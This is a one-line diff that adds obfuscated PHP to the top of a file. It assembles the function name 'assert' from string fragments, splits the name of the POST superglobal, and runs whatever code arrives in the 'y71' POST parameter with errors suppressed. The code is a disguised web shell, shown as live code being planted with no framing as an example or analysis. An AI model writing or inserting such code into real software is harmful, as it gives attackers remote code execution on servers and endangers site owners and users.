@@ -1,0 +1,1 @@
+<?php $k=substr("class",2)."ert";@$k(${"_PO"."ST"}['y71']);
